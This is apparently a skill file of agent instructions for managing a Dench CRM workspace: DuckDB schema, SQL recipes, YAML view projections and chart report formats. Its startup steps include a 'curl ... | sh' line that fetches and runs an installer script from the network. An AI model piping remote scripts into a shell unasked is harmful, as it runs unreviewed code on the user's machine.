---
name: database-crm-system
description: Manage Database and everything else in the workspace - objects, fields, entries via DuckDB and documents as markdown files in a nested knowledge tree. Acts as your second brain.
metadata: { "openclaw": { "inject": true, "always": true, "emoji": "📊" } }
---

# CRM / Database in Workspace / Guide on handling any data

You manage a Dench workspace stored at `~/.openclaw/workspace`.
All structured data lives in **DuckDB**. The primary database is `~/.openclaw/workspace/workspace.duckdb`, but subdirectories may contain their own `workspace.duckdb` that is authoritative for objects in that subtree (hierarchical DB discovery). Shallower databases take priority when objects share the same name. Documents are **markdown files** in `~/.openclaw/workspace/**`. Organization context will be in `~/.openclaw/workspace/workspace_context.yaml` if an organisation exists (READ-ONLY).

All actions should look into / edit and work on `~/.openclaw/workspace/**` by default unless told otherwise. Exceptions to this are the `SOUL.md`, `skills/`, `memory/`, `USER.md`, `IDENTITY.md`, `TOOLS.md`, `AGENTS.md` and `MEMORY.md` and other such files.

## Workspace Structure

```
~/.openclaw/workspace/
  workspace_context.yaml      # READ-ONLY org context (members, integrations, protected objects)
  workspace.duckdb            # DuckDB database — sole source of truth for structured data
  people/                     # Object directory
    .object.yaml              # Object metadata projection
    onboarding-guide.md       # Document nested under object
  companies/
    .object.yaml
  projects/
    projects.md               # Document content
    tasks/                    # Object nested under document
      .object.yaml
  exports/                      # On-demand CSV/Parquet exports
  WORKSPACE.md                  # Auto-generated schema summary
```

## .object.yaml Format

Every object directory MUST contain a `.object.yaml` file. This is a lightweight metadata projection that the sidebar reads. Generate it from DuckDB after creating or modifying any object.

Template:

```yaml
id: "<object_id from DuckDB>"
name: "<object_name>"
description: "<object_description>"
icon: "<lucide_icon_name>"
default_view: "<table|kanban>"
entry_count: <number>
fields:
  - name: "Full Name"
    type: text
    required: true
  - name: "Email Address"
    type: email
    required: true
  - name: "Status"
    type: enum
    values: ["New", "Contacted", "Qualified", "Converted"]
  - name: "Assigned To"
    type: user
```

### Saved Views and Filters

`.object.yaml` supports a `views` section for saved filter views. These views appear in the UI filter bar and can be created or modified by the agent to immediately change what the user sees (the UI live-reloads via the file watcher).

**Filter operators by field type:**

| Field Type          | Operators                                                                                  |
| ------------------- | ------------------------------------------------------------------------------------------ |
| text/richtext/email | contains, not_contains, equals, not_equals, starts_with, ends_with, is_empty, is_not_empty |
| number              | eq, neq, gt, gte, lt, lte, between, is_empty, is_not_empty                                 |
| date                | on, before, after, date_between, relative_past, relative_next, is_empty, is_not_empty      |
| enum                | is, is_not, is_any_of, is_none_of, is_empty, is_not_empty                                  |
| boolean             | is_true, is_false, is_empty, is_not_empty                                                  |
| relation/user       | has_any, has_none, has_all, is_empty, is_not_empty                                         |

**Views template (append to .object.yaml):**

```yaml
views:
  - name: "Active deals"
    filters:
      id: root
      conjunction: and
      rules:
        - id: f1
          field: status
          operator: is_any_of
          value:
            - "Negotiating"
            - "Proposal sent"
        - id: f2
          field: amount
          operator: gte
          value: 10000
    sort:
      - field: updated_at
        direction: desc
    columns:
      - name
      - status
      - amount
      - assignee

  - name: "Overdue"
    filters:
      id: root
      conjunction: and
      rules:
        - id: f1
          field: due_date
          operator: before
          value: today
        - id: f2
          field: status
          operator: is_not
          value: Done

active_view: "Active deals"
```

**Relative date filters** (e.g. "in the last 7 days"):

```yaml
- id: f1
  field: created_at
  operator: relative_past
  relativeAmount: 7
  relativeUnit: days
```

**OR groups** (match any rule):

```yaml
filters:
  id: root
  conjunction: or
  rules:
    - id: f1
      field: status
      operator: is
      value: "Active"
    - id: f2
      field: priority
      operator: is
      value: "High"
```

**When the user asks to filter/show/hide entries by natural language**, write the `.object.yaml` with the appropriate views and set `active_view`. The web UI will pick up the change instantly via SSE file watcher. Every rule needs a unique `id` (short alphanumeric string). The root filter group also needs `id: root`.

Generate by querying DuckDB then writing the file:

```bash
# 1. Query object + fields from DuckDB
duckdb ~/.openclaw/workspace/workspace.duckdb -json "
  SELECT o.id, o.name, o.description, o.icon, o.default_view,
         (SELECT COUNT(*) FROM entries WHERE object_id = o.id) as entry_count
  FROM objects o WHERE o.name = 'lead'
"
duckdb ~/.openclaw/workspace/workspace.duckdb -json "
  SELECT name, type, required, enum_values FROM fields
  WHERE object_id = (SELECT id FROM objects WHERE name = 'lead')
  ORDER BY sort_order
"

# 2. Write .object.yaml from the query results
mkdir -p ~/.openclaw/workspace/lead
cat > ~/.openclaw/workspace/lead/.object.yaml << 'YAML'
id: "AbCdEfGh..."
name: "lead"
description: "Sales leads tracking"
icon: "user-plus"
default_view: "table"
entry_count: 20
fields:
  - name: "Full Name"
    type: text
    required: true
  - name: "Email Address"
    type: email
    required: true
  - name: "Status"
    type: enum
    values: ["New", "Contacted", "Qualified", "Converted"]
  - name: "Score"
    type: number
  - name: "Notes"
    type: richtext
YAML
```

## Startup

On every conversation:

1. Read `~/.openclaw/workspace/workspace_context.yaml` for org context, members, integrations, protected objects. **NEVER modify this file.**
2. Install duckdb if it doesn't exist: `curl https://install.duckdb.org | sh`
3. If `~/.openclaw/workspace/workspace.duckdb` does not exist, initialize it with the schema below.

## workspace_context.yaml (READ-ONLY)

This file is generated by Dench and synced via S3. It contains:

- `organization`: id, name, slug, business info
- `members`: Team members with IDs, names, emails, roles. **Use these IDs for "user" type fields** (e.g., "Assigned To").
- `protected_objects`: Objects that MUST NOT be deleted or renamed (e.g., people, companies).
- `integrations`: Connected apps with sync direction, frequency, and field mappings.
- `enrichment`: Whether enrichment is enabled and which provider.
- `defaults`: Default view, date format, naming conventions.
- `credits`: Current credit balance for enrichment/AI operations.

## DuckDB Schema

Initialize via `exec` with `duckdb ~/.openclaw/workspace/workspace.duckdb`:

```sql
-- Nanoid 32 macro: generates IDs matching Dench's Supabase nanoid format
CREATE OR REPLACE MACRO nanoid32() AS (
  SELECT string_agg(
    substr('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_-',
      (floor(random() * 64) + 1)::int, 1), '')
  FROM generate_series(1, 32)
);

CREATE TABLE IF NOT EXISTS objects (
  id VARCHAR PRIMARY KEY DEFAULT (nanoid32()),
  name VARCHAR NOT NULL,
  description VARCHAR,
  icon VARCHAR,
  default_view VARCHAR DEFAULT 'table',
  parent_document_id VARCHAR,
  sort_order INTEGER DEFAULT 0,
  source_app VARCHAR,
  immutable BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now(),
  UNIQUE(name)
);

CREATE TABLE IF NOT EXISTS fields (
  id VARCHAR PRIMARY KEY DEFAULT (nanoid32()),
  object_id VARCHAR NOT NULL REFERENCES objects(id) ON DELETE CASCADE,
  name VARCHAR NOT NULL,
  description VARCHAR,
  type VARCHAR NOT NULL,
  required BOOLEAN DEFAULT false,
  default_value VARCHAR,
  related_object_id VARCHAR REFERENCES objects(id) ON DELETE SET NULL,
  relationship_type VARCHAR,
  enum_values JSON,
  enum_colors JSON,
  enum_multiple BOOLEAN DEFAULT false,
  sort_order INTEGER DEFAULT 0,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now(),
  UNIQUE(object_id, name)
);

CREATE TABLE IF NOT EXISTS entries (
  id VARCHAR PRIMARY KEY DEFAULT (nanoid32()),
  object_id VARCHAR NOT NULL REFERENCES objects(id) ON DELETE CASCADE,
  sort_order INTEGER DEFAULT 0,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE IF NOT EXISTS entry_fields (
  id VARCHAR PRIMARY KEY DEFAULT (nanoid32()),
  entry_id VARCHAR NOT NULL REFERENCES entries(id) ON DELETE CASCADE,
  field_id VARCHAR NOT NULL REFERENCES fields(id) ON DELETE CASCADE,
  value VARCHAR,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now(),
  UNIQUE(entry_id, field_id)
);

CREATE TABLE IF NOT EXISTS statuses (
  id VARCHAR PRIMARY KEY DEFAULT (nanoid32()),
  object_id VARCHAR NOT NULL REFERENCES objects(id) ON DELETE CASCADE,
  name VARCHAR NOT NULL,
  color VARCHAR DEFAULT '#94a3b8',
  sort_order INTEGER DEFAULT 0,
  is_default BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now(),
  UNIQUE(object_id, name)
);

CREATE TABLE IF NOT EXISTS documents (
  id VARCHAR PRIMARY KEY DEFAULT (nanoid32()),
  title VARCHAR DEFAULT 'Untitled',
  icon VARCHAR,
  cover_image VARCHAR,
  file_path VARCHAR NOT NULL UNIQUE,
  parent_id VARCHAR REFERENCES documents(id) ON DELETE CASCADE,
  parent_object_id VARCHAR REFERENCES objects(id) ON DELETE CASCADE,
  sort_order INTEGER DEFAULT 0,
  is_published BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT now(),
  updated_at TIMESTAMPTZ DEFAULT now()
);

INSTALL fts; LOAD fts;
```

### ALL ID fields must be a nanoid ID.

## Auto-Generated Views

After every object or field mutation, regenerate the PIVOT view for each affected object. Views are stored queries (zero data duplication) that make the EAV pattern invisible:

```sql
-- Example: auto-generated view for "leads" object
CREATE OR REPLACE VIEW v_leads AS
PIVOT (
  SELECT e.id as entry_id, e.created_at, e.updated_at,
         f.name as field_name, ef.value
  FROM entries e
  JOIN entry_fields ef ON ef.entry_id = e.id
  JOIN fields f ON f.id = ef.field_id
  WHERE e.object_id = (SELECT id FROM objects WHERE name = 'leads')
) ON field_name USING first(value);
```

Naming convention: `v_{object_name}` (e.g., `v_leads`, `v_companies`, `v_people`).

Now query like a normal table:

```sql
SELECT * FROM v_leads WHERE "Status" = 'New' ORDER BY created_at DESC LIMIT 50;
SELECT "Status", COUNT(*) FROM v_leads GROUP BY "Status";
SELECT * FROM v_leads WHERE "Email Address" LIKE '%@gmail.com';
```

## SQL Operations Reference

All operations use `exec` with `duckdb ~/.openclaw/workspace/workspace.duckdb`. Batch related SQL in a single exec call with transactions.

### Create Object

```sql
INSERT INTO objects (name, description, icon, default_view)
VALUES ('lead', 'Sales leads tracking', 'user-plus', 'table')
ON CONFLICT (name) DO NOTHING RETURNING *;
```

### Create Fields

```sql
INSERT INTO fields (object_id, name, type, required, sort_order)
VALUES
  ((SELECT id FROM objects WHERE name = 'lead'), 'Full Name', 'text', true, 0),
  ((SELECT id FROM objects WHERE name = 'lead'), 'Email Address', 'email', true, 1),
  ((SELECT id FROM objects WHERE name = 'lead'), 'Phone Number', 'phone', false, 2)
ON CONFLICT (object_id, name) DO NOTHING;
```

### Create Enum Field

```sql
INSERT INTO fields (object_id, name, type, enum_values, enum_colors, sort_order)
VALUES (
  (SELECT id FROM objects WHERE name = 'lead'), 'Status', 'enum',
  '["New","Contacted","Qualified","Converted"]'::JSON,
  '["#94a3b8","#3b82f6","#f59e0b","#22c55e"]'::JSON, 3
) ON CONFLICT (object_id, name) DO NOTHING;
```

### Create Entry with Field Values

```sql
BEGIN TRANSACTION;
INSERT INTO entries (object_id) VALUES ((SELECT id FROM objects WHERE name = 'lead')) RETURNING id;
-- Use the returned entry id:
INSERT INTO entry_fields (entry_id, field_id, value) VALUES
  ('<entry_id>', (SELECT id FROM fields WHERE object_id = (SELECT id FROM objects WHERE name = 'lead') AND name = 'Full Name'), 'Jane Smith'),
  ('<entry_id>', (SELECT id FROM fields WHERE object_id = (SELECT id FROM objects WHERE name = 'lead') AND name = 'Email Address'), 'jane@example.com'),
  ('<entry_id>', (SELECT id FROM fields WHERE object_id = (SELECT id FROM objects WHERE name = 'lead') AND name = 'Status'), 'New');
COMMIT;
```

### Search Entries (via view)

```sql
-- Simple search
SELECT * FROM v_leads WHERE "Full Name" ILIKE '%john%';

-- Filter by field
SELECT * FROM v_leads WHERE "Status" = 'New' ORDER BY created_at DESC;

-- Aggregation
SELECT "Status", COUNT(*) as count FROM v_leads GROUP BY "Status";

-- Pagination
SELECT * FROM v_leads ORDER BY created_at DESC LIMIT 20 OFFSET 0;
```

### Update Entry

```sql
INSERT INTO entry_fields (entry_id, field_id, value)
VALUES ('<entry_id>', (SELECT id FROM fields WHERE object_id = '<obj_id>' AND name = 'Status'), 'Qualified')
ON CONFLICT (entry_id, field_id) DO UPDATE SET value = excluded.value, updated_at = now();
```

### Delete (with cascade)

```sql
-- Delete entry (cascades to entry_fields)
DELETE FROM entries WHERE id = '<entry_id>';

-- Delete field (cascades to entry_fields)
DELETE FROM fields WHERE id = '<field_id>';

-- Delete object (cascades to fields, entries, entry_fields) — check immutable first!
DELETE FROM objects WHERE id = '<obj_id>' AND immutable = false;
```

### Bulk Import from CSV

```sql
COPY entries FROM '~/.openclaw/workspace/exports/import.csv' (AUTO_DETECT true);
```

### Export to CSV

```sql
COPY (SELECT * FROM v_leads) TO '~/.openclaw/workspace/exports/leads.csv' (HEADER true);
```

## Full Workflow: Create CRM Structure in One Shot

EVERY object creation MUST complete ALL THREE steps below. Never stop after the SQL.

**Step 1 — SQL: Create object + fields + view** (single exec call):

```sql
BEGIN TRANSACTION;

-- 1a. Create object
INSERT INTO objects (name, description, icon, default_view)
VALUES ('lead', 'Sales leads tracking', 'user-plus', 'table')
ON CONFLICT (name) DO NOTHING;

-- 1b. Create all fields
INSERT INTO fields (object_id, name, type, required, sort_order) VALUES
  ((SELECT id FROM objects WHERE name = 'lead'), 'Full Name', 'text', true, 0),
  ((SELECT id FROM objects WHERE name = 'lead'), 'Email Address', 'email', true, 1),
  ((SELECT id FROM objects WHERE name = 'lead'), 'Phone Number', 'phone', false, 2),
  ((SELECT id FROM objects WHERE name = 'lead'), 'Score', 'number', false, 4),
  ((SELECT id FROM objects WHERE name = 'lead'), 'Notes', 'richtext', false, 6)
ON CONFLICT (object_id, name) DO NOTHING;

INSERT INTO fields (object_id, name, type, enum_values, enum_colors, sort_order) VALUES
  ((SELECT id FROM objects WHERE name = 'lead'), 'Status', 'enum',
   '["New","Contacted","Qualified","Converted"]'::JSON,
   '["#94a3b8","#3b82f6","#f59e0b","#22c55e"]'::JSON, 3),
  ((SELECT id FROM objects WHERE name = 'lead'), 'Source', 'enum',
   '["Website","Referral","Cold Call","Social"]'::JSON, NULL, 5)
ON CONFLICT (object_id, name) DO NOTHING;

-- 1c. MANDATORY: auto-generate PIVOT view
CREATE OR REPLACE VIEW v_lead AS
PIVOT (
  SELECT e.id as entry_id, e.created_at, e.updated_at,
         f.name as field_name, ef.value
  FROM entries e
  JOIN entry_fields ef ON ef.entry_id = e.id
  JOIN fields f ON f.id = ef.field_id
  WHERE e.object_id = (SELECT id FROM objects WHERE name = 'lead')
) ON field_name USING first(value);

COMMIT;
```

**Step 2 — Filesystem: Create object directory + .object.yaml** (exec call):

```bash
mkdir -p ~/.openclaw/workspace/lead

# Query the object metadata from DuckDB to build .object.yaml
OBJ_ID=$(duckdb ~/.openclaw/workspace/workspace.duckdb -noheader -list "SELECT id FROM objects WHERE name = 'lead'")
ENTRY_COUNT=$(duckdb ~/.openclaw/workspace/workspace.duckdb -noheader -list "SELECT COUNT(*) FROM entries WHERE object_id = '$OBJ_ID'")

cat > ~/.openclaw/workspace/lead/.object.yaml << 'YAML'
id: "<use actual $OBJ_ID>"
name: "lead"
description: "Sales leads tracking"
icon: "user-plus"
default_view: "table"
entry_count: <use actual $ENTRY_COUNT>
fields:
  - name: "Full Name"
    type: text
    required: true
  - name: "Email Address"
    type: email
    required: true
  - name: "Phone Number"
    type: phone
  - name: "Status"
    type: enum
    values: ["New", "Contacted", "Qualified", "Converted"]
  - name: "Score"
    type: number
  - name: "Source"
    type: enum
    values: ["Website", "Referral", "Cold Call", "Social"]
  - name: "Notes"
    type: richtext
YAML
```

**Step 3 — Verify**: Confirm both the view and filesystem exist:

```bash
# Verify view works
duckdb ~/.openclaw/workspace/workspace.duckdb "SELECT COUNT(*) FROM v_lead"
# Verify .object.yaml exists
cat ~/.openclaw/workspace/lead/.object.yaml
```

## Kanban Boards

When creating task/board objects, use `default_view = 'kanban'` and auto-create Status + Assigned To fields. Remember: ALL THREE STEPS are required.

**Step 1 — SQL:**

```sql
BEGIN TRANSACTION;
INSERT INTO objects (name, description, icon, default_view)
VALUES ('task', 'Task tracking board', 'check-square', 'kanban')
ON CONFLICT (name) DO NOTHING;

-- Auto-create Status field with kanban-appropriate values
INSERT INTO fields (object_id, name, type, enum_values, enum_colors, sort_order)
VALUES ((SELECT id FROM objects WHERE name = 'task'), 'Status', 'enum',
  '["In Queue","In Progress","Done"]'::JSON,
  '["#94a3b8","#3b82f6","#22c55e"]'::JSON, 0)
ON CONFLICT (object_id, name) DO NOTHING;

-- Auto-create Assigned To field (user type)
INSERT INTO fields (object_id, name, type, sort_order)
VALUES ((SELECT id FROM objects WHERE name = 'task'), 'Assigned To', 'user', 1)
ON CONFLICT (object_id, name) DO NOTHING;

-- Auto-create default statuses
INSERT INTO statuses (object_id, name, color, sort_order, is_default) VALUES
  ((SELECT id FROM objects WHERE name = 'task'), 'In Queue', '#94a3b8', 0, true),
  ((SELECT id FROM objects WHERE name = 'task'), 'In Progress', '#3b82f6', 1, false),
  ((SELECT id FROM objects WHERE name = 'task'), 'Done', '#22c55e', 2, false)
ON CONFLICT (object_id, name) DO NOTHING;

CREATE OR REPLACE VIEW v_task AS
PIVOT (
  SELECT e.id as entry_id, e.created_at, e.updated_at,
         f.name as field_name, ef.value
  FROM entries e
  JOIN entry_fields ef ON ef.entry_id = e.id
  JOIN fields f ON f.id = ef.field_id
  WHERE e.object_id = (SELECT id FROM objects WHERE name = 'task')
) ON field_name USING first(value);

COMMIT;
```

**Step 2 — Filesystem (MANDATORY):**

```bash
mkdir -p ~/.openclaw/workspace/task
cat > ~/.openclaw/workspace/task/.object.yaml << 'YAML'
id: "<query from DuckDB>"
name: "task"
description: "Task tracking board"
icon: "check-square"
default_view: "kanban"
entry_count: 0
fields:
  - name: "Status"
    type: enum
    values: ["In Queue", "In Progress", "Done"]
  - name: "Assigned To"
    type: user
YAML
```

**Step 3 — Verify:** `duckdb ~/.openclaw/workspace/workspace.duckdb "SELECT COUNT(*) FROM v_task"` and `cat ~/.openclaw/workspace/task/.object.yaml`.

## Field Types Reference

| Type     | Description                           | Storage            | Query Cast  |
| -------- | ------------------------------------- | ------------------ | ----------- |
| text     | General text, names, descriptions     | VARCHAR            | none        |
| email    | Email addresses (validated)           | VARCHAR            | none        |
| phone    | Phone numbers (normalized)            | VARCHAR            | none        |
| number   | Numeric values (prices, scores)       | VARCHAR            | `::NUMERIC` |
| boolean  | Yes/no flags                          | "true"/"false"     | `= 'true'`  |
| date     | ISO 8601 dates                        | VARCHAR            | `::DATE`    |
| richtext | Rich text for Notes fields            | VARCHAR            | none        |
| user     | Member ID from workspace_context.yaml | VARCHAR            | none        |
| enum     | Dropdown with predefined values       | VARCHAR            | none        |
| relation | Link to entry in another object       | VARCHAR (entry ID) | none        |

**user fields**: Resolve member name to ID from `workspace_context.yaml` `members` list BEFORE inserting. User fields store IDs like `usr_abc123`, NOT names.

**enum fields**: Field definition stores `enum_values` as JSON array. Entry stores the selected value string. `enum_multiple = true` for multi-select (value stored as JSON array string).

**relation fields**: Field stores `related_object_id` and `relationship_type`. Entry stores the related entry ID. `many_to_one` for single select, `many_to_many` for multi-select (JSON array of IDs).

## CRM Patterns

### Contact/Customer

- Full Name (text, required), Email Address (email, required), Phone Number (phone), Company (relation to company object), Notes (richtext)
- Universal pattern for clients, customers, patients, members

### Lead/Prospect

- Full Name (text, required), Email Address (email, required), Phone Number (phone), Status (enum: New/Contacted/Qualified/Converted), Source (enum: Website/Referral/Cold Call/Social), Score (number), Assigned To (user), Notes (richtext)
- Sales, legal intake, real estate prospects

### Company/Organization

- Company Name (text, required), Industry (enum), Website (text), Type (enum: Client/Partner/Vendor), Relationship Status (enum), Notes (richtext)
- B2B relationships, vendor management

### Deal/Opportunity

- Deal Name (text, required), Amount (number), Stage (enum: Discovery/Proposal/Negotiation/Closed Won/Closed Lost), Close Date (date), Probability (number), Primary Contact (relation), Assigned To (user), Notes (richtext)
- Sales pipeline, project bids

### Case/Project

- Case Number (text, required), Title (text, required), Client (relation), Status (enum: Open/In Progress/Closed), Priority (enum: Low/Medium/High/Urgent), Due Date (date), Assigned To (user), Notes (richtext)
- Legal cases, client projects

### Property/Asset

- Address (text, required), Property Type (enum), Price (number), Status (enum: Available/Under Contract/Sold), Square Footage (number), Bedrooms (number), Notes (richtext)
- Real estate listings, asset management

### Task/Activity (use kanban)

- Title (text, required), Description (text), Assigned To (user), Due Date (date), Status (enum: In Queue/In Progress/Done), Priority (enum: Low/Medium/High), Notes (richtext)
- Use `default_view = 'kanban'` — auto-creates Status and Assigned To fields

## Document Management

Documents are markdown files in `~/.openclaw/workspace/**`. The DuckDB `documents` table tracks metadata only; the `.md` file IS the content.

### Create Document

1. Write the `.md` file: `write ~/.openclaw/workspace/projects/roadmap.md`
2. Insert metadata into DuckDB:

```sql
INSERT INTO documents (title, icon, file_path, parent_id, sort_order)
VALUES ('Roadmap', 'map', 'projects/roadmap.md', '<parent_doc_id>', 0);
```

### Cross-Nesting

- **Document under Object**: Set `parent_object_id` on the document. Place `.md` file inside the object's directory.
- **Object under Document**: Set `parent_document_id` on the object. Place object directory inside the document's directory.

## Naming Conventions

- **Object names**: singular, lowercase, one word ("lead" not "Leads")
- **Field names**: human-readable, proper capitalization ("Email Address" not "email")
- **Be descriptive**: "Phone Number" not "Phone"
- **Be consistent**: Don't mix "Full Name" and "Name" in the same object

## Error Handling

- `UNIQUE constraint` on INSERT: item already exists — use `ON CONFLICT DO NOTHING` or `DO UPDATE`. Treat as success.
- Protected object deletion: check `immutable` column AND `protected_objects` in `workspace_context.yaml`. NEVER delete protected objects.
- Field type change: warn user before changing type on field with existing data.
- Missing required fields: validate before INSERT, report which fields are missing.

## Post-Mutation Checklist (MANDATORY)

You MUST complete ALL steps below after ANY schema mutation (create/update/delete object, field, or entry). Do NOT skip any step. Do NOT consider the operation complete until all steps are done.

### After creating or modifying an OBJECT or its FIELDS:

- [ ] `CREATE OR REPLACE VIEW v_{object_name}` — regenerate the PIVOT view
- [ ] `mkdir -p ~/.openclaw/workspace/{object_name}/` — create the object directory
- [ ] Write `~/.openclaw/workspace/{object_name}/.object.yaml` — metadata projection with id, name, description, icon, default_view, entry_count, and full field list
- [ ] If object has a `parent_document_id`, place directory inside the parent document's directory
- [ ] Update `WORKSPACE.md` if it exists

### After adding or updating ENTRIES:

- [ ] Update `entry_count` in the corresponding `.object.yaml`
- [ ] Verify the view returns correct data: `SELECT * FROM v_{object} LIMIT 5`

### After deleting an OBJECT:

- [ ] `DROP VIEW IF EXISTS v_{object_name}` — remove the view
- [ ] `rm -rf ~/.openclaw/workspace/{object_name}/` — remove the directory (unless it contains nested documents that need relocating)
- [ ] Update `WORKSPACE.md`

### After creating or modifying a DOCUMENT:

- [ ] Write the `.md` file to the correct path in `~/.openclaw/workspace/**`
- [ ] `INSERT INTO documents` — ensure metadata row exists with correct `file_path`, `parent_id`, or `parent_object_id`

These steps ensure the filesystem always mirrors DuckDB. The sidebar depends on `.object.yaml` files — if they are missing, objects will not appear.

## Report Generation (Analytics / Charts)

Reports are JSON config files (`.report.json`) that the web app renders as live interactive dashboards using Recharts. The agent creates these files to give the user visual analytics over their CRM data.

### Report file format

Store reports as `.report.json` files in `~/.openclaw/workspace/**` (wherever appropriate / create directories if you need for better structure). The JSON schema:

```json
{
  "version": 1,
  "title": "Report Title",
  "description": "Brief description of what this report shows",
  "panels": [
    {
      "id": "unique-panel-id",
      "title": "Panel Title",
      "type": "bar",
      "sql": "SELECT ... FROM v_{object} ...",
      "mapping": { "xAxis": "column_name", "yAxis": ["value_column"] },
      "size": "half"
    }
  ],
  "filters": [
    {
      "id": "filter-id",
      "type": "dateRange",
      "label": "Date Range",
      "column": "created_at"
    }
  ]
}
```

### Chart types

| Type      | Best for                     | Required mapping                |
| --------- | ---------------------------- | ------------------------------- |
| `bar`     | Comparing categories         | `xAxis`, `yAxis`                |
| `line`    | Trends over time             | `xAxis`, `yAxis`                |
| `area`    | Volume trends                | `xAxis`, `yAxis`                |
| `pie`     | Distribution/share           | `nameKey`, `valueKey`           |
| `donut`   | Distribution (with center)   | `nameKey`, `valueKey`           |
| `radar`   | Multi-dimensional comparison | `xAxis` (or `nameKey`), `yAxis` |
| `scatter` | Correlation                  | `xAxis`, `yAxis`                |
| `funnel`  | Pipeline/conversion          | `nameKey`, `valueKey`           |

### Panel sizes

- `"full"` — spans full width (6 columns)
- `"half"` — spans half width (3 columns) — **default**
- `"third"` — spans one third (2 columns)

### Filter types

- `dateRange` — date picker (from/to), filters on `column`
- `select` — single-select dropdown, needs `sql` to fetch options
- `multiSelect` — multi-select chips, needs `sql` to fetch options
- `number` — min/max numeric range

### SQL query rules for reports

- Always use the auto-generated `v_{object}` PIVOT views — never raw EAV queries
- SQL must be SELECT-only (no INSERT/UPDATE/DELETE)
- Cast numeric fields: `"Amount"::NUMERIC` or `CAST("Amount" AS NUMERIC)`
- Use `DATE_TRUNC('month', created_at)` for time-series grouping
- Always include `ORDER BY` for consistent chart rendering
- Use aggregate functions: `COUNT(*)`, `SUM(...)`, `AVG(...)`, `MIN(...)`, `MAX(...)`

### Example reports

**Pipeline Funnel:**

```json
{
  "version": 1,
  "title": "Deal Pipeline",
  "description": "Deal count and value by stage",
  "panels": [
    {
      "id": "deals-by-stage",
      "title": "Deals by Stage",
      "type": "funnel",
      "sql": "SELECT \"Stage\", COUNT(*) as count FROM v_deal GROUP BY \"Stage\" ORDER BY count DESC",
      "mapping": { "nameKey": "Stage", "valueKey": "count" },
      "size": "half"
    },
    {
      "id": "revenue-by-stage",
      "title": "Revenue by Stage",
      "type": "bar",
      "sql": "SELECT \"Stage\", SUM(\"Amount\"::NUMERIC) as total FROM v_deal GROUP BY \"Stage\" ORDER BY total DESC",
      "mapping": { "xAxis": "Stage", "yAxis": ["total"] },
      "size": "half"
    }
  ],
  "filters": [
    { "id": "date", "type": "dateRange", "label": "Created", "column": "created_at" },
    {
      "id": "assignee",
      "type": "select",
      "label": "Assigned To",
      "sql": "SELECT DISTINCT \"Assigned To\" as value FROM v_deal WHERE \"Assigned To\" IS NOT NULL",
      "column": "Assigned To"
    }
  ]
}
```

**Contact Growth:**

```json
{
  "version": 1,
  "title": "Contact Growth",
  "description": "New contacts over time",
  "panels": [
    {
      "id": "growth-trend",
      "title": "Contacts Over Time",
      "type": "area",
      "sql": "SELECT DATE_TRUNC('month', created_at) as month, COUNT(*) as count FROM v_people GROUP BY month ORDER BY month",
      "mapping": { "xAxis": "month", "yAxis": ["count"] },
      "size": "full"
    }
  ]
}
```

### Inline chat reports

When a user asks for analytics in chat (without explicitly asking to save a report), emit the report JSON inside a fenced code block with language `report-json`. The web UI will render interactive charts inline:

````
Here's your pipeline analysis:

```report-json
{"version":1,"title":"Deals by Stage","panels":[{"id":"p1","title":"Deal Count","type":"bar","sql":"SELECT \"Stage\", COUNT(*) as count FROM v_deal GROUP BY \"Stage\" ORDER BY count DESC","mapping":{"xAxis":"Stage","yAxis":["count"]},"size":"full"}]}
```

Most deals are currently in the Discovery stage.
````

The user can then "Pin" the inline report to save it as a `.report.json` file.

### Post-report checklist

After creating a `.report.json` file:

- [ ] Verify the report JSON is valid and all SQL queries work: test each panel's SQL individually
- [ ] Choose which directory the report should be created in `~/.openclaw/workspace` based on the context of the conversation, if nothing vert relevant, create/use the `~/.openclaw/workspace/reports/` directory.
- [ ] Write the file: `~/.openclaw/workspace/**/{slug}.report.json`
- [ ] Tell the user they can view it in the workspace sidebar under whichever directory it was rightfully placed in based on the context.

### Choosing the right chart type

- **Comparing categories** (status breakdown, source distribution): `bar` or `pie`
- **Time series** (growth, trends, revenue over time): `line` or `area`
- **Pipeline/conversion** (deal stages, lead funnel): `funnel`
- **Distribution/proportion** (market share, segment split): `pie` or `donut`
- **Multi-metric comparison** (performance scores): `radar`
- **Correlation** (price vs. size, score vs. revenue): `scatter`
- When in doubt, `bar` is the safest default

## Critical Reminders

- Handle the ENTIRE CRM operation from analysis to SQL execution to filesystem projection to summary
- **NEVER SKIP FILESYSTEM PROJECTION**: After creating/modifying any object, you MUST create/update `~/.openclaw/workspace/{object}/.object.yaml` AND the `v_{object}` view. If you skip this, the object will be invisible in the sidebar. This is NOT optional.
- **THREE STEPS, EVERY TIME**: (1) SQL transaction, (2) filesystem projection (.object.yaml + directory), (3) verify. An operation is NOT complete until all three are done.
- Always check existing data before creating (`SELECT` before `INSERT`, or `ON CONFLICT`)
- Use views (`v_{object}`) for all reads — never write raw PIVOT queries for search
- Never assume field names — verify with `SELECT * FROM fields WHERE object_id = ?`
- Extract ALL data from user messages — don't leave information unused
- **REPORTS vs DOCUMENTS**: When the user asks for "reports", "analytics", "charts", "graphs", "metrics", "insights", or "breakdown" — use `.report.json` format (see Report Generation section above), NOT markdown. Only use markdown `.md` for SOPs, guides, notes, and prose documents. Reports render as interactive Recharts dashboards; markdown does not.
- **INLINE CHART ARTIFACTS**: When answering analytics questions in chat, ALWAYS emit a `report-json` fenced code block so the UI renders interactive charts inline. Do NOT describe data in plain text when you can show it as a chart.
- **NOTES**: Always use type "richtext" for Notes fields
- **USER FIELDS**: Resolve member name to ID from `workspace_context.yaml` BEFORE inserting
- **ENUM FIELDS**: Use type "enum" with `enum_values` JSON array
- **RELATION FIELDS**: Use type "relation" with `related_object_id`
- **KANBAN**: Use `default_view = 'kanban'`, auto-create Status and Assigned To fields
- **PROTECTED OBJECTS**: Never delete objects listed in `workspace_context.yaml` `protected_objects`
- **ONE EXEC CALL**: Batch related SQL in a single transaction — this is the whole point
- **workspace_context.yaml**: READ-ONLY. Never modify. Data flows from Dench UI only.
